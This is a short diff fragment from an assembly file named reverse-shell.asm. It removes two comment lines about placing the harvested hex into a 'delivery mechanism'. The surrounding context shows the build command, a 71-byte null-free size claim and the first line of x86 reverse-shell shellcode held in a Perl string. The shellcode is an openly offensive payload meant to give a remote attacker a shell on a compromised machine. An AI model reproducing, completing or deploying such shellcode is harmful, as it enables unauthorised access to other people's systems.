@@ -4,8 +4,6 @@
 ; nasm -f bin reverse-shell.asm
 ; 71 Bytes with zero nulls or carriage returns
 ;
-; After building the binary, harvest the hex code to place
-; into the delivery mechanism.
 %comment
 my $sc =
 "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\x6a\x66\x58\xcd" . 
